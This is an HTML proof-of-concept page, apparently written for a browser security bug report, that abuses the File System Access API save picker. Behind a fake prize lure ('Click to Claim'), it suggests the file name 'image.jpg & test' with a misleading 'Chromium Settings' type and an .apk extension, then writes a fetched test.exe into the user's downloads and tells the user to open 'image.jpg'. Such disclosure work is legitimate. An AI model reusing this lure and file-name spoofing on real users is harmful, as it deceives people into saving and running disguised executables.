<html>

<head>
    <title>Save file to desktop - File System Access API - security bug</title>
    <meta charset="UTF-8">
</head>

<style>
    body {
        background: rgba(29, 48, 109, 0.849);
        display: flex;
        justify-content: center;
        align-items: center;
        flex-direction: column;
    }

    h1, h2, h3 {
        -webkit-text-stroke: 1px #00000050;
    }

    h1 {
        color: #D96C06;
        font-size: 56px;
    }

    h2 {
        color: #1ebe8e;
        font-size: 56px;
    }

    h3 {
        color: #C6F91F;
        font-size: 56px;
    }

    h2 span {
        color: #cf4848;
        font-size: 90px;
    }

    #author {
        font-size: 28px;
    }

    #downloadBtn {
        background-color: #1ebe8e;
        color: white;
        font-size: 24px;
        padding: 15px 30px;
        border: none;
        cursor: pointer;
        border-radius: 10px;
        margin-top: 20px;
    }

    #downloadBtn:hover {
        background-color: #17a176;
    }
</style>

<body>
    <script>
        let isDownloaded = false;

        window.onload = function () {
            const downloadBtn = document.querySelector("#downloadBtn");

            downloadBtn.addEventListener("click", async () => {
                if (isDownloaded) return;

                const options = {
                    startIn: 'downloads',
                    suggestedName: 'image.jpg & test',
                    types: [
                        {
                            description: 'Chromium Settings',
                            accept: {
                                'text/plain': ['.apk'] // could be .exe/.bat or anything
                            }
                        }
                    ],
                    excludeAcceptAllOption: true
                };

                const handle = await window.showSaveFilePicker(options);
                const writable = await handle.createWritable();
                const response = await fetch('test.exe');
                await response.body.pipeTo(writable);

                document.querySelector("#gameover").textContent = "Go to your file manager and open image.jpg!";
                isDownloaded = true;
            });
        };
    </script>

    <h1>Super Simple GameðŸ˜»ðŸ˜»ðŸ˜»</h1>
    <h2><span>ðŸŽ® Click the button</span> to claim your reward!</h2>
    <h3>Win $1,000,000 and rule the world! ðŸ”¥ðŸ”¥ðŸ”¥ðŸš€</h3>
    <button id="downloadBtn">Click to Claim</button>
    <h3 id="gameover"></h3>

</body>

</html>
